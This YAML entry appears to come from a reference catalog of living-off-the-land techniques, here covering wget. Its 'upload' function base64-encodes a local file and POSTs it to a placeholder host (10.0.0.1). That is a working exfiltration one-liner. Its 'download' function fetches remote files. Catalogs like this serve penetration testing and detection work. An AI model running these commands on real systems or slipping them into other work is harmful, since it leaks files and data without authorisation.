---
functions:
  upload:
    - description: Send base64-encoded local file via "d" parameter of a HTTP POST request.
      code: |
        export URL=http://10.0.0.1/
        export LFILE=file_to_send
        wget --post-data="d=$(base64 $LFILE | tr -d '\n')" $URL
  download:
    - description: Fetch a remote file via HTTP GET request.
      code: |-
        export URL=http://10.0.0.1/file_to_get
        export LFILE=file_to_get
        wget $URL -O $LFILE
---